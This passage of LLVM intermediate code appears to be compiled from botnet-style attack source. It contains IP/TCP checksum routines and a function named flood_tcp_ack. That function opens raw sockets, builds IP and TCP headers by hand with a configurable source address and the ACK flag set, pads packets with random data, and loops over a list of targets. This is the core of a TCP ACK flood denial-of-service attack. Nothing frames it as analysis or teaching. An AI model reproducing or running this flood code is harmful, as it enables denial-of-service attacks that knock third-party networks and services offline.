  br i1 %cmp.zero, label %.lr.ph.preheader28, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi22 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load25 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load25 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi22
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !1

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx26 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx26, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge.loopexit, label %.lr.ph.preheader28

.lr.ph.preheader28:                               ; preds = %middle.block, %min.iters.checked, %.lr.ph.preheader
  %.015.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph.preheader ], [ %19, %middle.block ]
  %.01114.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph.preheader ], [ %ind.end, %middle.block ]
  %.01213.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph.preheader ], [ %ind.end21, %middle.block ]
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader28, %.lr.ph
  %.015 = phi i64 [ %23, %.lr.ph ], [ %.015.ph, %.lr.ph.preheader28 ]
  %.01114 = phi i32 [ %24, %.lr.ph ], [ %.01114.ph, %.lr.ph.preheader28 ]
  %.01213 = phi i16* [ %20, %.lr.ph ], [ %.01213.ph, %.lr.ph.preheader28 ]
  %20 = getelementptr inbounds i16, i16* %.01213, i64 1
  %21 = load i16, i16* %.01213, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.015
  %24 = add i32 %.01114, -2
  %25 = icmp ugt i32 %24, 1
  br i1 %25, label %.lr.ph, label %._crit_edge.loopexit.loopexit, !llvm.loop !4

._crit_edge.loopexit.loopexit:                    ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %._crit_edge.loopexit.loopexit, %middle.block
  %.lcssa = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  %.012.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge.loopexit ]
  %.011.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa, %._crit_edge.loopexit ]
  %27 = icmp eq i32 %.011.lcssa, 1
  br i1 %27, label %28, label %33

; <label>:28:                                     ; preds = %._crit_edge
  %29 = load i16, i16* %.012.lcssa, align 2
  %30 = zext i16 %29 to i64
  %sext = shl i64 %30, 56
  %31 = ashr exact i64 %sext, 56
  %32 = add i64 %31, %.0.lcssa
  br label %33

; <label>:33:                                     ; preds = %28, %._crit_edge
  %.1 = phi i64 [ %32, %28 ], [ %.0.lcssa, %._crit_edge ]
  %34 = lshr i64 %.1, 16
  %35 = and i64 %.1, 65535
  %36 = add nuw nsw i64 %34, %35
  %37 = lshr i64 %36, 16
  %38 = add nuw nsw i64 %37, %36
  %39 = trunc i64 %38 to i16
  %40 = xor i16 %39, -1
  ret i16 %40
}

; Function Attrs: noinline nounwind readonly uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr* nocapture readonly, i8* nocapture readonly, i16 zeroext, i32) local_unnamed_addr #1 {
  %5 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %8 = load i32, i32* %7, align 4
  %9 = icmp sgt i32 %3, 1
  br i1 %9, label %.lr.ph33.preheader, label %._crit_edge34

.lr.ph33.preheader:                               ; preds = %4
  %10 = bitcast i8* %1 to i16*
  %11 = add i32 %3, -2
  %12 = lshr i32 %11, 1
  %13 = shl nuw i32 %12, 1
  %14 = zext i32 %13 to i64
  %15 = add nuw nsw i64 %14, 2
  %scevgep = getelementptr i8, i8* %1, i64 %15
  %16 = shl nuw i32 %12, 1
  %17 = add i32 %3, -2
  %18 = lshr i32 %17, 1
  %addconv = add nuw i32 %18, 1
  %min.iters.check = icmp ult i32 %addconv, 8
  br i1 %min.iters.check, label %.lr.ph33.preheader53, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph33.preheader
  %19 = zext i32 %addconv to i64
  %20 = and i32 %addconv, 7
  %n.mod.vf = zext i32 %20 to i64
  %n.vec = sub nsw i64 %19, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %21 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %3, %21
  %ind.end45 = getelementptr i16, i16* %10, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph33.preheader53, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <4 x i32> [ %27, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi47 = phi <4 x i32> [ %28, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %10, i64 %index
  %22 = bitcast i16* %next.gep to <4 x i16>*
  %wide.load = load <4 x i16>, <4 x i16>* %22, align 2
  %23 = getelementptr i16, i16* %next.gep, i64 4
  %24 = bitcast i16* %23 to <4 x i16>*
  %wide.load49 = load <4 x i16>, <4 x i16>* %24, align 2
  %25 = zext <4 x i16> %wide.load to <4 x i32>
  %26 = zext <4 x i16> %wide.load49 to <4 x i32>
  %27 = add <4 x i32> %25, %vec.phi
  %28 = add <4 x i32> %26, %vec.phi47
  %index.next = add i64 %index, 8
  %29 = icmp eq i64 %index.next, %n.vec
  br i1 %29, label %middle.block, label %vector.body, !llvm.loop !6

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <4 x i32> %28, %27
  %rdx.shuf = shufflevector <4 x i32> %bin.rdx, <4 x i32> undef, <4 x i32> <i32 2, i32 3, i32 undef, i32 undef>
  %bin.rdx50 = add <4 x i32> %bin.rdx, %rdx.shuf
  %rdx.shuf51 = shufflevector <4 x i32> %bin.rdx50, <4 x i32> undef, <4 x i32> <i32 1, i32 undef, i32 undef, i32 undef>
  %bin.rdx52 = add <4 x i32> %bin.rdx50, %rdx.shuf51
  %30 = extractelement <4 x i32> %bin.rdx52, i32 0
  %cmp.n = icmp eq i32 %20, 0
  br i1 %cmp.n, label %._crit_edge34.loopexit, label %.lr.ph33.preheader53

.lr.ph33.preheader53:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph33.preheader
  %.031.ph = phi i32 [ %3, %min.iters.checked ], [ %3, %.lr.ph33.preheader ], [ %ind.end, %middle.block ]
  %.02630.ph = phi i32 [ 0, %min.iters.checked ], [ 0, %.lr.ph33.preheader ], [ %30, %middle.block ]
  %.02729.ph = phi i16* [ %10, %min.iters.checked ], [ %10, %.lr.ph33.preheader ], [ %ind.end45, %middle.block ]
  br label %.lr.ph33

.lr.ph33:                                         ; preds = %.lr.ph33.preheader53, %.lr.ph33
  %.031 = phi i32 [ %35, %.lr.ph33 ], [ %.031.ph, %.lr.ph33.preheader53 ]
  %.02630 = phi i32 [ %33, %.lr.ph33 ], [ %.02630.ph, %.lr.ph33.preheader53 ]
  %.02729 = phi i16* [ %34, %.lr.ph33 ], [ %.02729.ph, %.lr.ph33.preheader53 ]
  %31 = load i16, i16* %.02729, align 2
  %32 = zext i16 %31 to i32
  %33 = add i32 %32, %.02630
  %34 = getelementptr inbounds i16, i16* %.02729, i64 1
  %35 = add nsw i32 %.031, -2
  %36 = icmp sgt i32 %35, 1
  br i1 %36, label %.lr.ph33, label %._crit_edge34.loopexit.loopexit, !llvm.loop !7

._crit_edge34.loopexit.loopexit:                  ; preds = %.lr.ph33
  br label %._crit_edge34.loopexit

._crit_edge34.loopexit:                           ; preds = %._crit_edge34.loopexit.loopexit, %middle.block
  %.lcssa43 = phi i32 [ %30, %middle.block ], [ %33, %._crit_edge34.loopexit.loopexit ]
  %37 = sub i32 %11, %16
  br label %._crit_edge34

._crit_edge34:                                    ; preds = %._crit_edge34.loopexit, %4
  %38 = phi i8* [ %1, %4 ], [ %scevgep, %._crit_edge34.loopexit ]
  %.026.lcssa = phi i32 [ 0, %4 ], [ %.lcssa43, %._crit_edge34.loopexit ]
  %.0.lcssa = phi i32 [ %3, %4 ], [ %37, %._crit_edge34.loopexit ]
  %39 = icmp eq i32 %.0.lcssa, 1
  br i1 %39, label %40, label %44

; <label>:40:                                     ; preds = %._crit_edge34
  %41 = load i8, i8* %38, align 1
  %42 = zext i8 %41 to i32
  %43 = add i32 %42, %.026.lcssa
  br label %44

; <label>:44:                                     ; preds = %40, %._crit_edge34
  %.1 = phi i32 [ %43, %40 ], [ %.026.lcssa, %._crit_edge34 ]
  %45 = lshr i32 %6, 16
  %46 = and i32 %6, 65535
  %47 = lshr i32 %8, 16
  %48 = and i32 %8, 65535
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i16
  %52 = tail call zeroext i16 @htons(i16 zeroext %51) #14
  %53 = zext i16 %52 to i32
  %54 = zext i16 %2 to i32
  %55 = add nuw nsw i32 %45, %54
  %56 = add nuw nsw i32 %55, %46
  %57 = add nuw nsw i32 %56, %47
  %58 = add nuw nsw i32 %57, %48
  %59 = add i32 %58, %.1
  %60 = add i32 %59, %53
  %61 = lshr i32 %60, 16
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %44
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %63 = phi i32 [ %66, %.lr.ph ], [ %61, %.lr.ph.preheader ]
  %.228 = phi i32 [ %65, %.lr.ph ], [ %60, %.lr.ph.preheader ]
  %64 = and i32 %.228, 65535
  %65 = add nuw nsw i32 %64, %63
  %66 = lshr i32 %65, 16
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %44
  %.2.lcssa = phi i32 [ %60, %44 ], [ %65, %._crit_edge.loopexit ]
  %68 = trunc i32 %.2.lcssa to i16
  %69 = xor i16 %68, -1
  ret i16 %69
}

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #4

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) local_unnamed_addr #9

; Function Attrs: noinline noreturn nounwind uwtable
define void @flood_tcp_ack(%struct.arguments* nocapture readonly) #8 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %2, align 4
  %4 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 1
  %5 = load %struct.option*, %struct.option** %4, align 8
  %6 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 2
  %7 = load i8, i8* %6, align 8
  %8 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 2, i16 zeroext 900)
  %9 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 1, i16 zeroext -1)
  %10 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 7, i16 zeroext 255)
  %11 = trunc i16 %10 to i8
  %12 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 8, i16 zeroext -1)
  %13 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 9, i16 zeroext 1)
  %14 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 10, i16 zeroext 0)
  %15 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 11, i16 zeroext 0)
  %16 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 12, i16 zeroext 0)
  %17 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 13, i16 zeroext 0)
  %18 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 14, i16 zeroext 0)
  %19 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 15, i16 zeroext 0)
  %20 = trunc i16 %19 to i8
  %21 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 16, i16 zeroext -1)
  %22 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 17, i16 zeroext -1)
  %23 = load i32, i32* @LOCAL_ADDRESS, align 4
  %24 = tail call i32 @retrieve_opt_ipv4(%struct.option* %5, i8 zeroext %7, i8 zeroext 18, i32 %23)
  %25 = load %struct.option*, %struct.option** %4, align 8
  %26 = load i8, i8* %6, align 8
  %27 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %25, i8 zeroext %26, i8 zeroext 19, i16 zeroext -1)
  %28 = tail call i8* @retrieve_opt_str(%struct.option* %25, i8 zeroext %26, i8 zeroext 22, i8* inttoptr (i64 1 to i8*))
  %29 = ptrtoint i8* %28 to i64
  %30 = trunc i64 %29 to i32
  %31 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 3
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i64
  %34 = tail call noalias i8* @calloc(i64 %33, i64 8) #13
  %35 = bitcast i8* %34 to i8**
  %36 = icmp eq i8* %34, null
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %1
  tail call void @exit(i32 1) #15
  unreachable

; <label>:38:                                     ; preds = %1
  %39 = tail call noalias i8* @calloc(i64 %33, i64 4) #13
  %40 = bitcast i8* %39 to i32*
  %41 = icmp eq i8* %39, null
  br i1 %41, label %119, label %.preheader152

.preheader152:                                    ; preds = %38
  %42 = icmp eq i8 %32, 0
  br i1 %42, label %.preheader152..preheader_crit_edge, label %.lr.ph155

.preheader152..preheader_crit_edge:               ; preds = %.preheader152
  %.pre = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 0
  br label %.preheader

.lr.ph155:                                        ; preds = %.preheader152
  %43 = bitcast i32* %2 to i8*
  %44 = icmp eq i32 %30, 0
  %45 = zext i16 %8 to i32
  %46 = add nuw nsw i32 %45, 110
  %47 = zext i32 %46 to i64
  %48 = add i16 %8, 40
  %49 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 0
  %50 = shl i16 %13, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %14, 8
  %53 = and i16 %52, 256
  %54 = shl i16 %15, 13
  %55 = and i16 %54, 8192
  %56 = shl i16 %16, 11
  %57 = and i16 %56, 2048
  %58 = shl i16 %17, 10
  %59 = and i16 %58, 1024
  %60 = shl i16 %18, 9
  %61 = and i16 %60, 512
  %62 = or i16 %51, %53
  %63 = or i16 %62, %55
  %64 = or i16 %63, %57
  %.masked = or i16 %64, %59
  %65 = or i16 %.masked, %61
  %66 = or i16 %65, 80
  %67 = zext i16 %12 to i32
  br i1 %44, label %.lr.ph155.split.us.preheader, label %.lr.ph155.split.preheader

.lr.ph155.split.preheader:                        ; preds = %.lr.ph155
  br label %.lr.ph155.split

.lr.ph155.split.us.preheader:                     ; preds = %.lr.ph155
  br label %.lr.ph155.split.us

.lr.ph155.split.us:                               ; preds = %.lr.ph155.split.us.preheader, %78
  %indvars.iv162 = phi i64 [ %indvars.iv.next163, %78 ], [ 0, %.lr.ph155.split.us.preheader ]
  %68 = call i32 @socket(i32 2, i32 3, i32 6) #13
  %69 = getelementptr inbounds i32, i32* %40, i64 %indvars.iv162
  store i32 %68, i32* %69, align 4
  %70 = icmp eq i32 %68, -1
  br i1 %70, label %.us-lcssa.us.loopexit, label %71

; <label>:71:                                     ; preds = %.lr.ph155.split.us
  store i32 1, i32* %2, align 4
  %72 = call i32 @setsockopt(i32 %68, i32 0, i32 3, i8* nonnull %43, i32 4) #13
  %73 = icmp eq i32 %72, -1
  br i1 %73, label %.us-lcssa156.us.loopexit, label %74

; <label>:74:                                     ; preds = %71
  %75 = call noalias i8* @malloc(i64 %47) #13
  %76 = getelementptr inbounds i8*, i8** %35, i64 %indvars.iv162
  store i8* %75, i8** %76, align 8
  %77 = icmp eq i8* %75, null
  br i1 %77, label %.us-lcssa157.us.loopexit, label %78

; <label>:78:                                     ; preds = %74
  %79 = getelementptr inbounds i8, i8* %75, i64 20
  %80 = getelementptr inbounds i8, i8* %75, i64 40
  %81 = getelementptr inbounds i8, i8* %75, i64 1
  store i8 %20, i8* %81, align 1
  %82 = call zeroext i16 @htons(i16 zeroext %48) #14
  %83 = getelementptr inbounds i8, i8* %75, i64 2
  %84 = bitcast i8* %83 to i16*
  store i16 %82, i16* %84, align 2
  store i8 69, i8* %75, align 4
  %85 = getelementptr inbounds i8, i8* %75, i64 6
  %86 = bitcast i8* %85 to i16*
  store i16 0, i16* %86, align 2
  %87 = getelementptr inbounds i8, i8* %75, i64 8
  store i8 %11, i8* %87, align 4
  %88 = call zeroext i16 @htons(i16 zeroext %21) #14
  %89 = getelementptr inbounds i8, i8* %75, i64 4
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 4
  %91 = getelementptr inbounds i8, i8* %75, i64 9
  store i8 6, i8* %91, align 1
  %92 = getelementptr inbounds i8, i8* %75, i64 12
  %93 = bitcast i8* %92 to i32*
  store i32 %24, i32* %93, align 4
  %94 = load %struct.target*, %struct.target** %49, align 8
  %95 = getelementptr inbounds %struct.target, %struct.target* %94, i64 %indvars.iv162, i32 0
  %96 = load i32, i32* %95, align 4
  %97 = getelementptr inbounds i8, i8* %75, i64 16
  %98 = bitcast i8* %97 to i32*
  store i32 %96, i32* %98, align 4
  %99 = call zeroext i16 @htons(i16 zeroext %9) #14
  %100 = getelementptr inbounds i8, i8* %75, i64 22
  %101 = bitcast i8* %100 to i16*
  store i16 %99, i16* %101, align 2
  %102 = call zeroext i16 @htons(i16 zeroext %12) #14
  %103 = bitcast i8* %79 to i16*
  store i16 %102, i16* %103, align 4
  %104 = call zeroext i16 @htons(i16 zeroext %22) #14
  %105 = zext i16 %104 to i32
  %106 = getelementptr inbounds i8, i8* %75, i64 24
  %107 = bitcast i8* %106 to i32*
  store i32 %105, i32* %107, align 4
  %108 = getelementptr inbounds i8, i8* %75, i64 32
  %109 = bitcast i8* %108 to i16*
  store i16 %66, i16* %109, align 4
  %110 = getelementptr inbounds i8, i8* %75, i64 34
  %111 = bitcast i8* %110 to i16*
  store i16 0, i16* %111, align 2
  %112 = call zeroext i16 @htons(i16 zeroext %27) #14
  %113 = zext i16 %112 to i32
  %114 = getelementptr inbounds i8, i8* %75, i64 28
  %115 = bitcast i8* %114 to i32*
  store i32 %113, i32* %115, align 4
  call void @rand_string(i8* %80, i32 %45)
  %indvars.iv.next163 = add nuw i64 %indvars.iv162, 1
  %116 = load i8, i8* %31, align 1
  %117 = zext i8 %116 to i64
  %118 = icmp slt i64 %indvars.iv.next163, %117
  br i1 %118, label %.lr.ph155.split.us, label %.preheader.loopexit

; <label>:119:                                    ; preds = %38
  tail call void @exit(i32 1) #15
  unreachable

.preheader.loopexit:                              ; preds = %78
  br label %.preheader

.preheader.loopexit181:                           ; preds = %144
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit181, %.preheader.loopexit, %.preheader152..preheader_crit_edge
  %.pre-phi = phi %struct.target** [ %.pre, %.preheader152..preheader_crit_edge ], [ %49, %.preheader.loopexit ], [ %49, %.preheader.loopexit181 ]
  %120 = phi i8 [ 0, %.preheader152..preheader_crit_edge ], [ %116, %.preheader.loopexit ], [ %182, %.preheader.loopexit181 ]
  %121 = zext i16 %8 to i64
  %122 = add nuw nsw i64 %121, 20
  %123 = trunc i64 %122 to i16
  %124 = trunc i64 %122 to i32
  %125 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  %126 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  %127 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  %128 = add nuw nsw i64 %121, 40
  %129 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  br label %.loopexit

.lr.ph155.split:                                  ; preds = %.lr.ph155.split.preheader, %144
  %indvars.iv164 = phi i64 [ %indvars.iv.next165, %144 ], [ 0, %.lr.ph155.split.preheader ]
  %130 = call i32 @socket(i32 2, i32 3, i32 6) #13
  %131 = getelementptr inbounds i32, i32* %40, i64 %indvars.iv164
  store i32 %130, i32* %131, align 4
  %132 = icmp eq i32 %130, -1
  br i1 %132, label %.us-lcssa.us.loopexit178, label %133

.us-lcssa.us.loopexit:                            ; preds = %.lr.ph155.split.us
  br label %.us-lcssa.us

.us-lcssa.us.loopexit178:                         ; preds = %.lr.ph155.split
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit178, %.us-lcssa.us.loopexit
  call void @free(i8* nonnull %34) #13
  call void @exit(i32 1) #15
  unreachable

; <label>:133:                                    ; preds = %.lr.ph155.split
  store i32 1, i32* %2, align 4
  %134 = call i32 @setsockopt(i32 %130, i32 0, i32 3, i8* nonnull %43, i32 4) #13
  %135 = icmp eq i32 %134, -1
  br i1 %135, label %.us-lcssa156.us.loopexit179, label %136

.us-lcssa156.us.loopexit:                         ; preds = %71
  br label %.us-lcssa156.us

.us-lcssa156.us.loopexit179:                      ; preds = %133
  br label %.us-lcssa156.us

.us-lcssa156.us:                                  ; preds = %.us-lcssa156.us.loopexit179, %.us-lcssa156.us.loopexit
  call void @free(i8* nonnull %34) #13
  call void @exit(i32 1) #15
  unreachable

; <label>:136:                                    ; preds = %133
  %137 = load %struct.target*, %struct.target** %49, align 8
  %138 = getelementptr inbounds %struct.target, %struct.target* %137, i64 %indvars.iv164, i32 0
  %139 = load i32, i32* %138, align 4
  %140 = call i32 @tcp_handshake(i16 zeroext %9, i32 %130, i32 %139, i32 %24, i32 %67)
  %141 = call noalias i8* @malloc(i64 %47) #13
  %142 = getelementptr inbounds i8*, i8** %35, i64 %indvars.iv164
  store i8* %141, i8** %142, align 8
  %143 = icmp eq i8* %141, null
  br i1 %143, label %.us-lcssa157.us.loopexit180, label %144

.us-lcssa157.us.loopexit:                         ; preds = %74
  br label %.us-lcssa157.us

.us-lcssa157.us.loopexit180:                      ; preds = %136
  br label %.us-lcssa157.us

.us-lcssa157.us:                                  ; preds = %.us-lcssa157.us.loopexit180, %.us-lcssa157.us.loopexit
  call void @free(i8* nonnull %34) #13
  call void @exit(i32 1) #15
  unreachable

; <label>:144:                                    ; preds = %136
  %145 = getelementptr inbounds i8, i8* %141, i64 20
  %146 = getelementptr inbounds i8, i8* %141, i64 40
  %147 = getelementptr inbounds i8, i8* %141, i64 1
  store i8 %20, i8* %147, align 1
  %148 = call zeroext i16 @htons(i16 zeroext %48) #14
  %149 = getelementptr inbounds i8, i8* %141, i64 2
  %150 = bitcast i8* %149 to i16*
  store i16 %148, i16* %150, align 2
  store i8 69, i8* %141, align 4
  %151 = getelementptr inbounds i8, i8* %141, i64 6
  %152 = bitcast i8* %151 to i16*
  store i16 0, i16* %152, align 2
  %153 = getelementptr inbounds i8, i8* %141, i64 8
  store i8 %11, i8* %153, align 4
  %154 = call zeroext i16 @htons(i16 zeroext %21) #14
  %155 = getelementptr inbounds i8, i8* %141, i64 4
  %156 = bitcast i8* %155 to i16*
  store i16 %154, i16* %156, align 4
  %157 = getelementptr inbounds i8, i8* %141, i64 9
  store i8 6, i8* %157, align 1
  %158 = getelementptr inbounds i8, i8* %141, i64 12
  %159 = bitcast i8* %158 to i32*
  store i32 %24, i32* %159, align 4
  %160 = load %struct.target*, %struct.target** %49, align 8
  %161 = getelementptr inbounds %struct.target, %struct.target* %160, i64 %indvars.iv164, i32 0
  %162 = load i32, i32* %161, align 4
  %163 = getelementptr inbounds i8, i8* %141, i64 16
  %164 = bitcast i8* %163 to i32*
  store i32 %162, i32* %164, align 4
  %165 = call zeroext i16 @htons(i16 zeroext %9) #14
  %166 = getelementptr inbounds i8, i8* %141, i64 22
  %167 = bitcast i8* %166 to i16*
  store i16 %165, i16* %167, align 2
  %168 = call zeroext i16 @htons(i16 zeroext %12) #14
  %169 = bitcast i8* %145 to i16*
  store i16 %168, i16* %169, align 4
  %170 = call zeroext i16 @htons(i16 zeroext %22) #14
  %171 = zext i16 %170 to i32
  %172 = getelementptr inbounds i8, i8* %141, i64 24
  %173 = bitcast i8* %172 to i32*
  store i32 %171, i32* %173, align 4
  %174 = getelementptr inbounds i8, i8* %141, i64 32
  %175 = bitcast i8* %174 to i16*
  store i16 %66, i16* %175, align 4
  %176 = getelementptr inbounds i8, i8* %141, i64 34
  %177 = bitcast i8* %176 to i16*
  store i16 0, i16* %177, align 2
  %178 = call zeroext i16 @htons(i16 zeroext %27) #14
  %179 = zext i16 %178 to i32
  %180 = getelementptr inbounds i8, i8* %141, i64 28
  %181 = bitcast i8* %180 to i32*
  store i32 %179, i32* %181, align 4
  call void @rand_string(i8* %146, i32 %45)
  %indvars.iv.next165 = add nuw i64 %indvars.iv164, 1
  %182 = load i8, i8* %31, align 1
  %183 = zext i8 %182 to i64
  %184 = icmp slt i64 %indvars.iv.next165, %183
  br i1 %184, label %.lr.ph155.split, label %.preheader.loopexit181

.loopexit.loopexit:                               ; preds = %233
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  %185 = phi i8 [ %120, %.preheader ], [ %.be, %.loopexit.backedge ]
  %186 = icmp eq i8 %185, 0
  br i1 %186, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  %.be = phi i8 [ 0, %.loopexit ], [ %248, %.loopexit.loopexit ]
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %233
  %indvars.iv = phi i64 [ %indvars.iv.next, %233 ], [ 0, %.lr.ph.preheader ]
  %187 = getelementptr inbounds i8*, i8** %35, i64 %indvars.iv
  %188 = bitcast i8** %187 to %struct.iphdr**
  %189 = load %struct.iphdr*, %struct.iphdr** %188, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 1
  %191 = load %struct.target*, %struct.target** %.pre-phi, align 8
  %192 = getelementptr inbounds %struct.target, %struct.target* %191, i64 %indvars.iv, i32 1
  %193 = load i16, i16* %192, align 4
  %194 = icmp ult i16 %193, 32
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 0, i32 0
  br i1 %194, label %196, label %201

; <label>:196:                                    ; preds = %.lr.ph
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 0, i32 9
  %198 = load i32, i32* %197, align 4
  %199 = call i32 @ntohl(i32 %198) #14
  %200 = call i32 @htonl(i32 %199) #14
  store i32 %200, i32* %197, align 4
  br label %201

; <label>:201:                                    ; preds = %196, %.lr.ph
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 0, i32 8
  %203 = load i32, i32* %202, align 4
  %204 = icmp eq i32 %203, -1
  br i1 %204, label %205, label %206

; <label>:205:                                    ; preds = %201
  store i32 0, i32* %202, align 4
  br label %206

; <label>:206:                                    ; preds = %205, %201
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 0, i32 3
  %208 = load i16, i16* %207, align 4
  %209 = icmp eq i16 %208, -1
  br i1 %209, label %210, label %211

; <label>:210:                                    ; preds = %206
  store i16 0, i16* %207, align 4
  br label %211

; <label>:211:                                    ; preds = %210, %206
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 1, i32 2
  %213 = load i16, i16* %212, align 2
  %214 = icmp eq i16 %213, -1
  br i1 %214, label %215, label %216

; <label>:215:                                    ; preds = %211
  store i16 0, i16* %212, align 2
  br label %216

; <label>:216:                                    ; preds = %215, %211
  %217 = bitcast %struct.iphdr* %190 to i16*
  %218 = load i16, i16* %217, align 4
